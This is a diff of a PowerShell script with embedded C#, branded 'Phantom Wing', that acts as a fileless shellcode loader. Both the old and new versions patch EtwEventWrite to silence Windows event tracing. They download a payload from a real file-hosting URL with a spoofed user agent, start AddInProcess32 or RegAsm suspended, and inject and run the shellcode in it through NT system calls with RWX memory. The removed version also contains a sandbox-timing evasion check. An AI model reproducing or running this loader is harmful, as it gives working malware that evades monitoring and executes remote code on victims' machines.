@@ -1,174 +1,230 @@
-Write-Host ""
-Write-Host "  ENI x LO :: Phantom Wing" -ForegroundColor Magenta
-Write-Host "  target: AddInProcess32 | NT syscalls | fileless" -ForegroundColor DarkMagenta
-Write-Host ""
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072
 
-$src = @"
+function Write-EniLog {
+    $t = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff"
+    Write-Host "[$t] [ENI] $($args[0])"
+}
+
+$EniCode = @'
 using System;
-using System.Net;
 using System.Runtime.InteropServices;
 
-public class Wing {
+public static class EniNative
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
+        uint flNewProtect, out uint lpflOldProtect);
 
-    // ── imports ────────────────────────────────────────────
-    [DllImport("ker"+"nel32.dll")]
-    static extern IntPtr LoadLib(string n);
+    [DllImport("kernel32.dll", SetLastError = true)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
 
-    [DllImport("ker"+"nel32.dll", EntryPoint="LoadLibraryA")]
-    static extern IntPtr LoadLibA(string n);
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern IntPtr GetModuleHandleW(string lpModuleName);
 
-    [DllImport("ker"+"nel32.dll", EntryPoint="GetProcAddress")]
-    static extern IntPtr GPA(IntPtr h, string p);
-
-    [DllImport("ker"+"nel32.dll", EntryPoint="VirtualProtect")]
-    static extern bool VP(IntPtr a, UIntPtr s, uint p, out uint o);
-
-    [DllImport("ker"+"nel32.dll", EntryPoint="CreateProcessA")]
-    static extern bool CPA(string app, string cmd,
-        IntPtr pa, IntPtr ta, bool inh, uint fl,
-        IntPtr env, string dir,
-        ref SUI si, out PRI pi);
-
-    [DllImport("nt"+"dll.dll", EntryPoint="NtAllocateVirtualMemory")]
-    static extern uint NAVM(IntPtr hp, ref IntPtr ba,
-        IntPtr zb, ref IntPtr rs, uint at, uint pr);
-
-    [DllImport("nt"+"dll.dll", EntryPoint="NtWriteVirtualMemory")]
-    static extern uint NWVM(IntPtr hp, IntPtr ba,
-        byte[] buf, uint n, out uint wr);
-
-    [DllImport("nt"+"dll.dll", EntryPoint="NtCreateThreadEx")]
-    static extern uint NCTE(out IntPtr th, uint acc,
-        IntPtr oa, IntPtr hp, IntPtr sa, IntPtr pm,
-        bool sus, int sz, int ss, int ms, IntPtr al);
-
-    // ── structs ────────────────────────────────────────────
-    [StructLayout(LayoutKind.Sequential)]
-    public struct SUI {
-        public int    cb, x, y, xs, ys, xc, yc, fa, fl;
-        public short  sw, r2;
-        public IntPtr r3, si, so, se;
-        public string r0, de, ti;
-    }
+    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool CreateProcessW(
+        string lpApplicationName,
+        string lpCommandLine,
+        IntPtr lpProcessAttributes,
+        IntPtr lpThreadAttributes,
+        bool bInheritHandles,
+        uint dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        ref STARTUPINFOW lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
 
     [StructLayout(LayoutKind.Sequential)]
-    public struct PRI {
-        public IntPtr hp, ht;
-        public int    pid, tid;
+    public struct STARTUPINFOW
+    {
+        public int cb;
+        public IntPtr lpReserved;
+        public IntPtr lpDesktop;
+        public IntPtr lpTitle;
+        public int dwX;
+        public int dwY;
+        public int dwSizeX;
+        public int dwSizeY;
+        public int dwXCountChars;
+        public int dwYCountChars;
+        public int dwFillAttribute;
+        public int dwFlags;
+        public short wShowWindow;
+        public short cbReserved2;
+        public IntPtr lpReserved2;
+        public IntPtr hStdInput;
+        public IntPtr hStdOutput;
+        public IntPtr hStdError;
     }
 
-    // ── blind ETW only ─────────────────────────────────────
-    static void Blind() {
-        // ETW Patch Only (AMSI removed)
-        try {
-            IntPtr h = LoadLibA("nt"+"dl"+"l.dl"+"l");
-            IntPtr f = GPA(h, "Etw"+"Eve"+"nt"+"Wri"+"te");
-            uint o; VP(f,(UIntPtr)1,0x40,out o);
-            Marshal.WriteByte(f,0xC3);
-            VP(f,(UIntPtr)1,o,out o);
-            Console.WriteLine("[~] ETW  : silenced");
-        } catch {}
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PROCESS_INFORMATION
+    {
+        public IntPtr hProcess;
+        public IntPtr hThread;
+        public int dwProcessId;
+        public int dwThreadId;
     }
 
-    // ── sandbox timing check ──────────────────────────────
-    static bool IsReal() {
-        var t = DateTime.UtcNow;
-        System.Threading.Thread.Sleep(1800);
-        return (DateTime.UtcNow - t).TotalMilliseconds >= 900;
+    public static PROCESS_INFORMATION CreateSuspendedProcess(string imagePath)
+    {
+        var si = new STARTUPINFOW();
+        si.cb = Marshal.SizeOf(typeof(STARTUPINFOW));
+        si.dwFlags = 1;
+        si.wShowWindow = 0;
+
+        PROCESS_INFORMATION pi;
+        bool ok = CreateProcessW(
+            null,
+            imagePath,
+            IntPtr.Zero,
+            IntPtr.Zero,
+            false,
+            4,
+            IntPtr.Zero,
+            null,
+            ref si,
+            out pi);
+
+        if (!ok)
+            throw new System.ComponentModel.Win32Exception(
+                Marshal.GetLastWin32Error(),
+                "CreateProcessW");
+
+        return pi;
     }
 
-    // ── main ──────────────────────────────────────────────
-    public static string Fly(string url) {
-        try {
-            if (!IsReal()) return "sandbox detected, abort";
+    [DllImport("ntdll.dll")]
+    public static extern int NtAllocateVirtualMemory(
+        IntPtr ProcessHandle,
+        ref IntPtr BaseAddress,
+        IntPtr ZeroBits,
+        ref uint RegionSize,
+        uint AllocationType,
+        uint Protect);
 
-            Blind();
+    [DllImport("ntdll.dll")]
+    public static extern int NtWriteVirtualMemory(
+        IntPtr ProcessHandle,
+        IntPtr BaseAddress,
+        byte[] Buffer,
+        uint BufferSize,
+        out uint NumberOfBytesWritten);
 
-            // pull shellcode - never touches disk
-            byte[] sc;
-            using (var w = new WebClient()) {
-                w.Headers["User-Agent"] = "Mozilla/5.0";
-                sc = w.DownloadData(url);
-            }
-            Console.WriteLine("[+] payload : " + sc.Length + " bytes");
-
-            // sacrificial process - legit .NET host
-            string t64 = System.Environment.GetEnvironmentVariable("windir")
-                + @"\Microsoft.NET\Framework64\v4.0.30319\AddInProcess32.exe";
-            string t32 = System.Environment.GetEnvironmentVariable("windir")
-                + @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe";
-
-            SUI si = new SUI();
-            si.cb = Marshal.SizeOf(si);
-            si.fl = 1; si.sw = 0;
-            PRI pi;
-
-            bool ok = CPA(null, t64, IntPtr.Zero, IntPtr.Zero,
-                false, 0x4|0x8000000, IntPtr.Zero, null, ref si, out pi);
-
-            if (!ok)
-                ok = CPA(null, t32, IntPtr.Zero, IntPtr.Zero,
-                    false, 0x4|0x8000000, IntPtr.Zero, null, ref si, out pi);
-
-            if (!ok) return "spawn failed";
-
-            Console.WriteLine("[+] target  : AddInProcess32 PID " + pi.pid + " (suspended)");
-
-            // NT alloc inside target - RWX
-            IntPtr ba = IntPtr.Zero;
-            IntPtr sz = (IntPtr)sc.Length;
-            uint s = NAVM(pi.hp, ref ba, IntPtr.Zero, ref sz, 0x3000, 0x40);
-            if (s != 0) return "NAVM: 0x" + s.ToString("X");
-
-            Console.WriteLine("[+] alloc   : 0x" + ba.ToString("X"));
-
-            // NT write
-            uint wr;
-            s = NWVM(pi.hp, ba, sc, (uint)sc.Length, out wr);
-            if (s != 0) return "NWVM: 0x" + s.ToString("X");
-
-            Console.WriteLine("[+] written : " + wr + " bytes");
-
-            // NT thread
-            IntPtr th;
-            s = NCTE(out th, 0x1FFFFF, IntPtr.Zero,
-                pi.hp, ba, IntPtr.Zero,
-                false, 0, 0, 0, IntPtr.Zero);
-            if (s != 0) return "NCTE: 0x" + s.ToString("X");
-
-            Console.WriteLine("[+] thread  : 0x" + th.ToString("X") + " running");
-            Console.WriteLine("[!] main thread stays suspended - host alive");
-
-            sc = null;
-            GC.Collect();
-            return "OK";
-
-        } catch(Exception ex) {
-            return "err: " + ex.Message;
-        }
-    }
+    [DllImport("ntdll.dll")]
+    public static extern int NtCreateThreadEx(
+        out IntPtr threadHandle,
+        uint desiredAccess,
+        IntPtr objectAttributes,
+        IntPtr processHandle,
+        IntPtr startAddress,
+        IntPtr parameter,
+        bool createSuspended,
+        int stackZeroBits,
+        int sizeOfStack,
+        int maximumStackSize,
+        IntPtr attributeList);
 }
-"@
+'@
 
-Write-Host "[*] compiling..." -ForegroundColor Yellow
+Write-EniLog "Compiling EniNative bridge"
+Add-Type -TypeDefinition $EniCode
+
+Write-EniLog "Patching ETW (EtwEventWrite -> 0xC3)"
+$ntdll = [EniNative]::GetModuleHandleW("ntdll.dll")
+$etwPtr = [EniNative]::GetProcAddress($ntdll, "EtwEventWrite")
+$oldProtect = 0
+[EniNative]::VirtualProtect($etwPtr, [UIntPtr]::new(1), 0x40, [ref]$oldProtect) | Out-Null
+[System.Runtime.InteropServices.Marshal]::WriteByte($etwPtr, 0xC3)
+[EniNative]::VirtualProtect($etwPtr, [UIntPtr]::new(1), $oldProtect, [ref]$null) | Out-Null
+
+Write-EniLog "Fetching payload (TLS 1.2, spoofed UA)"
+$wc = New-Object System.Net.WebClient
+$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+$shellcode = $wc.DownloadData("https://files.catbox.moe/4q44vi.bin")
+
+if (-not $shellcode -or $shellcode.Length -eq 0) {
+    throw "Empty payload"
+}
+
+$targets = @(
+    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",
+    "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe"
+)
+
+$procPath = $null
+foreach ($p in $targets) {
+    if (Test-Path $p) { $procPath = $p; break }
+}
+if (-not $procPath) { throw "No suitable host found" }
+
+Write-EniLog "Launching suspended: $procPath"
+$pi = [EniNative]::CreateSuspendedProcess($procPath)
+Write-EniLog ("hProcess = 0x{0:X16}, hThread = 0x{1:X16}, PID = {2}" -f [long]$pi.hProcess, [long]$pi.hThread, $pi.dwProcessId)
+
+Write-EniLog "NtAllocateVirtualMemory (MEM_COMMIT|RESERVE, RWX)"
+$baseAddr = [IntPtr]::Zero
+$regionSize = [uint32]$shellcode.Length
+$status = [EniNative]::NtAllocateVirtualMemory(
+    $pi.hProcess,
+    [ref]$baseAddr,
+    [IntPtr]::Zero,
+    [ref]$regionSize,
+    0x3000, 0x40)
+
+if ($status -ne 0) {
+    throw "NtAllocateVirtualMemory = 0x$('{0:X8}' -f $status)"
+}
+Write-EniLog ("BaseAddress = 0x{0:X16}, RegionSize = {1}" -f [long]$baseAddr, $regionSize)
+
+Write-EniLog "NtWriteVirtualMemory"
+$bytesWritten = 0
+$status = [EniNative]::NtWriteVirtualMemory(
+    $pi.hProcess,
+    $baseAddr,
+    $shellcode,
+    [uint32]$shellcode.Length,
+    [ref]$bytesWritten)
+
+if ($status -ne 0) {
+    throw "NtWriteVirtualMemory = 0x$('{0:X8}' -f $status)"
+}
+Write-EniLog ("Written {0} bytes" -f $bytesWritten)
+
+Write-EniLog "NtCreateThreadEx (access 0x1FFFFF)"
+$hThread = [IntPtr]::Zero
+$status = [EniNative]::NtCreateThreadEx(
+    [ref]$hThread,
+    0x001FFFFF,
+    [IntPtr]::Zero,
+    $pi.hProcess,
+    $baseAddr,
+    [IntPtr]::Zero,
+    $false,
+    0, 0, 0,
+    [IntPtr]::Zero)
+
+if ($status -ne 0) {
+    throw "NtCreateThreadEx = 0x$('{0:X8}' -f $status)"
+}
+Write-EniLog ("hThread = 0x{0:X16}" -f [long]$hThread)
+
+Write-EniLog "Purging local shellcode + GC collect"
+$shellcode = $null
+[System.GC]::Collect()
+[System.GC]::WaitForPendingFinalizers()
+
+Write-EniLog "Entering keep-alive loop (8s interval)"
 try {
-    Add-Type -TypeDefinition $src
-    Write-Host "[+] ready" -ForegroundColor Green
-} catch {
-    Write-Host "[-] compile failed: $_" -ForegroundColor Red
-    exit
+    $hostProc = [System.Diagnostics.Process]::GetProcessById($pi.dwProcessId)
+    while ($true) {
+        $hostProc.Refresh()
+        $tc = $hostProc.Threads.Count
+        $ws = [math]::Round($hostProc.WorkingSet64 / 1024, 2)
+        Write-EniLog ("PID {0} | Threads = {1} | WorkingSet = {2} KB" -f $pi.dwProcessId, $tc, $ws)
+        Start-Sleep -Seconds 8
+    }
 }
-
-$u  = 'https://files.catbox.moe'
-$u += '/4q44vi.bin'
-
-Write-Host "[*] launching..." -ForegroundColor Yellow
-$r = [Wing]::Fly($u)
-
-Write-Host ""
-if ($r -eq 'OK') {
-    Write-Host "  [+] ghost. shellcode lives in AddInProcess32. 🍩🖤" -ForegroundColor Green
-} else {
-    Write-Host "  [-] $r" -ForegroundColor Red
+catch {
+    Write-EniLog ("Process {0} exited: {1}" -f $pi.dwProcessId, $_.Exception.Message)
 }
-Write-Host ""
